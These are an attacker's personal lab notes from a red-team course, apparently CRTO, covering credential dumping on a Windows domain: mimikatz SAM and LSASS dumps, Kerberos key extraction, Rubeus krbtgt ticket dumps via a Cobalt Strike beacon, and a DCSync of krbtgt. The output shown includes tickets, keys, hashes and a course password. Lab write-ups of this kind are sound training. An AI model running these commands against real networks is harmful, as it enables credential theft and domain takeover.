---
created_date: 27 November 2023
updated_date: 27 November 2023
type: Windows Credentials
---

return: [[Penetration Testing v2/crto_Defender/access_Tracker|access_Tracker]]

once on `WKSTN2` as `SYSTEM` begin dumping hashes with `mimikatz`

command used to elevate and dump hashes `mimikatz token::elevate ; lsadump::sam` 
![[Pasted image 20231127103049.png]]
all were previously dumped by using the command `hashdump` in [[2.1 unquoted_service_path_abuse_artifact_Kit]] and documented in [[Penetration Testing v2/crto_Defender/access_Tracker|access_Tracker]]

# NTLM Hashes
dumping hashes from memory using the command `mimikatz !sekurlsa::logonpasswords`
	- received two new hashes - `jking` & `bfarmer` - added to the [[Penetration Testing v2/crto_Defender/access_Tracker|access_Tracker]]
![[Pasted image 20231127105615.png]]
![[Pasted image 20231127105943.png]]

# Kerberos Encryption Keys

Kerberos Encryption keys are able to be abused in Kerberos Abuse Scenarios

`mimikatz !sekurlsa::ekeys`
- looking for `aes256_hmac` or `des_cbc_md4` due to a bug

![[Pasted image 20231127122453.png]]

# Security Account Manager

SAM is used to store and dump local hashes (we already have these credentials from the `hashdump` command in [[2.1 unquoted_service_path_abuse_artifact_Kit]]
`mimikatz !lsadump::sam`

![[Pasted image 20231127123546.png]]

# Domain Cached Credentials 

DCC is used to store Domain hashes to be able to logon to a device while being disconnected from the domain conroller `i.e a roaming laptop`
- these credentials take forever to crack
- can be cracked utilizing `hashcat`
![[Pasted image 20231127123852.png]]

# Extracting Kerberos Tickets
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage` to identify the LUID and UserName association.
- typically utilized to pull the KRBTGT
![[Pasted image 20231127124423.png]]
to extract specific service `kerberos tickets`
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x1e2fbb /service:krbtgt`

DEV\bfarmer `krbtgt`
```powershell
[11/27 17:45:32] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x1e2fbb /service:krbtgt /nowrap
[11/27 17:45:37] [*] Tasked beacon to run .NET program: Rubeus.exe dump /luid:0x1e2fbb /service:krbtgt
[11/27 17:45:37] [+] host called home, sent: 550722 bytes
[11/27 17:45:37] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


Action: Dump Kerberos Ticket Data (All Users)

[*] Target service  : krbtgt
[*] Target LUID     : 0x1e2fbb
[*] Current LUID    : 0x3e7

  UserName                 : bfarmer
  Domain                   : DEV
  LogonId                  : 0x1e2fbb
  UserSID                  : S-1-5-21-569305411-121244042-2357301523-1104
  AuthenticationPackage    : Negotiate
  LogonType                : RemoteInteractive
  LogonTime                : 11/27/2023 3:17:57 PM
  LogonServer              : DC-2
  LogonServerDNSDomain     : DEV.CYBERBOTIC.IO
  UserPrincipalName        : bfarmer@cyberbotic.io


    ServiceName              :  krbtgt/DEV.CYBERBOTIC.IO
    ServiceRealm             :  DEV.CYBERBOTIC.IO
    UserName                 :  bfarmer
    UserRealm                :  DEV.CYBERBOTIC.IO
    StartTime                :  11/27/2023 3:17:59 PM
    EndTime                  :  11/28/2023 1:17:59 AM
    RenewTill                :  12/4/2023 3:17:59 PM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  rLvE+JKLWW8xTGPVMlBdaZu0MY969aYZiUJXSMlau0Q=
    Base64EncodedTicket   :

CCBcqgAwIBBaEDAgEWooIExTCCBMFhggS9MIIEuaADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBHMwggRvoAMCARKhAwIBAqKCBGEEggRd+XelbU7Evem9mHxXHq5UV8FU1lLQVN6xbh/1WB1McTGR6aymO+wtvTowfJg27BTwpOD9PpawBW6eoWwif9DH60kdTSAL80+4FPnd+aoMJ53Q+d0kYkcKV6UWfT45xnkIqdopcZbZPuBHHNc7Zvm34G0l1YUVwdZ5hHw/Ron6yxGQ6JEcHpV0dVvstC95L9CwcwXd2aCk0vgU4g2m9JMljmSxo9IcrXo3Sy1P8I2IsyGL3kK0vOQFh6RysxDR0SxJ6kYl6qTeZmYg/x/QUITVB/oDStMrNJJzJ5FHeiU1Z2JcP+hYbv+7oskFgUskHwOxaRJPlo3lUXmfnattgwoqOSBx2WTXSvl3tqjOxzSgkEfRxoChpm/PYKMTNyJy8mrBUGDLh//hpwvuLiEt8kWztzv+LUXk5zimyhJF8Xn9mB756MoWjOyOzOtiRI4rN7p2azS2gyJu7joRauyOJkVJEPmDHwo5FX510A9j9UYIS+WEtA8WFBbYXYn18VXZHz68hIuJi8NF8PUrLJIep4FoZvTUKFtnTDTjD6ZOcKn89AaIirsC1YXDKUQVceEL1njWyO9BhSHil1p8/dZb0POClF2frThfrijplEFmcOAJkkCXdYUEAeFWzY0/GSbgyqIhlhZJDhzZRdNzErkIUCbLDdQZLz+st+LMyUMUBoUwC0YoSWBXkQxksfBDbrfnXv+f//Z+GvFaCrC6AQla0xBjXBiMqaXu8iMBOsiPpueaRV14bc3SgtMKs9UQPYYIp4VVr/cLwzXf8kyxMBw0XuU57a8hNUGdI2s5Bc1w89KwbbTAZEAoApKc+udXrYwlx8gopt6GLZKEqPhrnYFeXDg5id4jLjQHy6MR/edtVXY0uXGZvbQUDPAQOqkjzz5H4N1ri6QXjygYC4+JlCRjAd8YWmUwtHuKv/nhxQtxbkieuvSWgz9zMnvg3xUDAQbZCk/HGREPKxUfVxuVDp7lCM9H70q2b1nTZlZlB34W0uo+6oYO8ArqEimtsF/QQhhwXm3ytwEXIYYw38aSSKEqtGn2DGWttoxIW+peHCDoo+VSwfNWFntnxs6a3OROWyAHAEesF8MAPEpNTx1rue7w4W8RcYBCdocyO+Cx9z7AM5fk4xGbA6t7DVgGOK1JwXdwa+yIz2B59ZUgHPcHbk1UyTD1tLkOscKrCjDYr48s9Tx7GdF1YkmNmbEi31cEvomkpjXoqMD7VufOvRryZTjoIPN/9A1wvHg8yTa5crUyFUbrTZ8l4rRJ7qhGaboipNveAnE37kuCqRb/IT8L84i/AdZSre1rNyGvOU7tbmLj+yfNOLfPwJuGDT1T5tLTy5CUgMH8rnyokrICnAlKIxn7aIijYwuy0Lpw6DiXJ+xNCZ7a6TDba/c7bnnVLN4QEHKLNuEqVWReIdlSJafHexHkkIbPxnzUHZZABnGqdfdEwiH3zsy8gwSX67QOBFGd8pd8aX7See0ifzZJSquJCJW/L6OB9DCB8aADAgEAooHpBIHmfYHjMIHgoIHdMIHaMIHXoCswKaADAgESoSIEIKy7xPiSi1lvMUxj1TJQXWmbtDGPevWmGYlCV0jJWrtEoRMbEURFVi5DWUJFUkJPVElDLklPohQwEqADAgEBoQswCRsHYmZhcm1lcqMHAwUAQOEAAKURGA8yMDIzMTEyNzE1MTc1OVqmERgPMjAyMzExMjgwMTE3NTlapxEYDzIwMjMxMjA0MTUxNzU5WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8=
```
DEV\jking `krbtgt`
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x5f29d /service:krbtgt`
- `/nowrap` for easier copying and pasting
```powershell
[11/27 17:48:09] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x5f29d /service:krbtgt /nowrap
[11/27 17:48:13] [*] Tasked beacon to run .NET program: Rubeus.exe dump /luid:0x5f29d /service:krbtgt
[11/27 17:48:14] [+] host called home, sent: 550720 bytes
[11/27 17:48:14] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


Action: Dump Kerberos Ticket Data (All Users)

[*] Target service  : krbtgt
[*] Target LUID     : 0x5f29d
[*] Current LUID    : 0x3e7

  UserName                 : jking
  Domain                   : DEV
  LogonId                  : 0x5f29d
  UserSID                  : S-1-5-21-569305411-121244042-2357301523-1105
  AuthenticationPackage    : Kerberos
  LogonType                : Batch
  LogonTime                : 11/27/2023 3:12:04 PM
  LogonServer              : DC-2
  LogonServerDNSDomain     : DEV.CYBERBOTIC.IO
  UserPrincipalName        : jking@cyberbotic.io


    ServiceName              :  krbtgt/DEV.CYBERBOTIC.IO
    ServiceRealm             :  DEV.CYBERBOTIC.IO
    UserName                 :  jking
    UserRealm                :  DEV.CYBERBOTIC.IO
    StartTime                :  11/27/2023 3:12:04 PM
    EndTime                  :  11/28/2023 1:12:04 AM
    RenewTill                :  12/4/2023 3:12:04 PM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  i4nuXbdtVHwzbEEZ0B4WpPx/NuCuCU2xDrF37HUEnR4=
    Base64EncodedTicket   :

doIFwjCCBb6gAwIBBaEDAgEWooIEuzCCBLdhggSzMIIEr6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBGkwggRloAMCARKhAwIBAqKCBFcEggRTZ+TJ7jyPSjIj91WnX9TRuUsQJFsJge9d5FDpuzGb0UxAuYYvjykZIxnp9q2YitqOpTJBoa6NY2iPxzNW3UQP9R5brolgeUu4DEdAZcKqpmA5plHkyaPSMwAId+HFRIgN/YzNbO+rOJj6EQNrrec3LV8Z8hQ/kwf9rPjzqzbNmRi8IJ2EgkkD3ubiE9YChm8fgGOOgh8V6FxX3ddprjIf84hRbnodbjD4GHQtB4QY24Z7f5k9PFz/3JXJqdCnyP4iurGV4TKPN2fwqfETOu/NwCcxM2juysc+WdTO46pG3Z0TE5ovZiAEY0V1wymlRGi5PGhCALSaSh/mN2YewUxBsoV6cUx6rW0OPO5GfzoTIcm6oP+NJAkdN0yfqYYlYAWHtvQAnLt7ku1Z4x5ouV4g6oG9ll/ozp8SQTKNPPenaDYsTkj/5VA3temz4HwwU0DfDpUSfrhD+UL1Fis2GhbwXPI5B/2FSNYuNe2KtfxCVdDy47rOKgbt72me7rdU5JAGmgGhbAiyaRMnn2UlCsiLnhAYxYU91kGL/jegEVVq75DdOYLk6m7FBeOuPp/aFulAfC1rA31C0VSM7EwWZHxFywUguW6CXOFV7ILRdoARzHl1qM+T1YQdTOlbg6PoYugB25rw2TPenbI0kNCWLAWdP5AJHlllukbHtn9cYYiSNM7bf3CvwtPSSEG0J0FPjVPBgqNAoWKWJxEcD6WqV/Dn1HX3y3Awl8FpHzYClgLQFDj80aEwxnVIVkNPFifstd7FUeROhOfzhpynV3VMqoPogWE+jkGU65eh4ELfRoPrjdacfSHDigoqInQdTBnLuAI3VsNinrk/og6rtUCxM52En4Snd5+4IznQSAEB8w6pnOvE2AJTbrh9YH9Vc42zmFbMsuq3LNVKKz3+VVzMnCC6sPD5sGuhIS04FsCWYmKv0BABkAra0UyElyRuhbJ0lGTUDZ0L2aTeNvEynioxHs+gMJA+Lu7fPruAsxuS6pWAYRR+hseqggJAgnVOxYwLIEzxqp8WxJhMYllNMehCphKDohiKbq3dFufFYrIxKns7CsMa2bTeQ3tCpg0FMTVyi+BVQW2oFF2DUksKbc1SMwH2pe1+XJes1IIe1i4flTAqmS5KA5PdjlpHYJndjY6NKFhzl2jPs9bBpctofwxDDsaCQWKnpHe1rUDfVQPw35l/Rcn37q7Y1zp7FWW6MCADJugP3jRCmOr2v/anoqBARVhQ3QsMMaxBp8E6lv4oxTEf5EAOqdfTRLyM1ACSWKJzZAfnHdE/WBG4FNAi3Ot7I8bnPckaqdeDShrGxzVQMF+NlDhbKpp5ydMf/Ox5XUYfoloRgKaSRKNZVForQUfOcED9nbh2V9x6ItlXK79/8ab8Bn5/xc9Gpl2hxLVOeqE4VNiGzy+sHqtWgQbLVZWBw+2RxqA0KPsluro19AVAyvMXKTc99O9dknnwCby7H3mlYWsNRhVpo4HyMIHvoAMCAQCigecEgeR9geEwgd6ggdswgdgwgdWgKzApoAMCARKhIgQgi4nuXbdtVHwzbEEZ0B4WpPx/NuCuCU2xDrF37HUEnR6hExsRREVWLkNZQkVSQk9USUMuSU+iEjAQoAMCAQGhCTAHGwVqa2luZ6MHAwUAQOEAAKURGA8yMDIzMTEyNzE1MTIwNFqmERgPMjAyMzExMjgwMTEyMDRapxEYDzIwMjMxMjA0MTUxMjA0WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8=
```

# DCSync
Have to already have domain credentials, preferably a domain admin to impersonate
- DEV\nlamb F3rrari were provided from course
```powershell
[11/27 17:58:22] beacon> make_token DEV\nlamb F3rrari
[11/27 17:58:22] [*] Tasked beacon to create a token for DEV\nlamb
[11/27 17:58:22] [+] host called home, sent: 35 bytes
[11/27 17:58:22] [+] Impersonated DEV\nlamb (netonly)
```
DCSync is utilized to sync and replicate AD data between Domain Controllers.
Used to extract NTLM and AES keys for the DEV\krbtgt account using lamb
```powershell
[11/27 17:58:44] beacon> dcsync dev.cyberbotic.io DEV\krbtgt
[11/27 17:58:44] [*] Tasked beacon to run mimikatz's @lsadump::dcsync /domain:dev.cyberbotic.io /user:DEV\krbtgt command
[11/27 17:58:44] [+] host called home, sent: 313667 bytes
[11/27 17:58:45] [+] received output:
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 8/15/2022 4:01:04 PM
Object Security ID   : S-1-5-21-569305411-121244042-2357301523-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9fb924c244ad44e934c390dc17e02c3d
    ntlm- 0: 9fb924c244ad44e934c390dc17e02c3d
    lm  - 0: 207d5e08551c51892309c0cf652c353b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 550703b3096dce5b5bdc9b735b79ee30

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e
      aes128_hmac       (4096) : 6fb62ed56c7de778ca5e4fe6da6d3aca
      des_cbc_md5       (4096) : 629189372a372fda

* Primary:Kerberos *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Credentials
      des_cbc_md5       : 629189372a372fda

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  82d27e18e5a51b359151719075b8efe6
    02  cacfaa14338412f71c5fc49ab4e1d50f
    03  a7ec666072cde603a927ed8ac683c337
    04  82d27e18e5a51b359151719075b8efe6
    05  cacfaa14338412f71c5fc49ab4e1d50f
    06  9e5eb5ea22776f75944637a664825a15
    07  82d27e18e5a51b359151719075b8efe6
    08  c723218f35f1568e2916d31e9bf9a7bf
    09  c723218f35f1568e2916d31e9bf9a7bf
    10  8131eb31cbeb570d96532ae55dbfa418
    11  1481ee3e83e68c4a4568e05758f01780
    12  c723218f35f1568e2916d31e9bf9a7bf
    13  2a730dd5bcc9b3561acfc500d6e855d3
    14  1481ee3e83e68c4a4568e05758f01780
    15  098e6f209b48d9d3338075ae91a37d44
    16  098e6f209b48d9d3338075ae91a37d44
    17  83834e22cfe70b6d2e17612840873048
    18  0542f8bf328626961ece6ffe2f7e104b
    19  c056ce79490f266b9379e9777fa482a0
    20  70850aab87c42c75b60f8084c2c19901
    21  7c4c9dc2a43a232fec42280344fdce23
    22  7c4c9dc2a43a232fec42280344fdce23
    23  6cd9bcf9e63591df5d18f9de3c972af5
    24  73a23dbb97eac22f5075dc9781d7721b
    25  73a23dbb97eac22f5075dc9781d7721b
    26  8ae72fdbb2e6cea2b017c90856891cad
    27  a6dc866ec7b1ccdce86cea695c74ccaf
    28  87664d84ea3a2993101d13f2b2825a9e
    29  bd839cda643ebdb4e8974ac010270395
```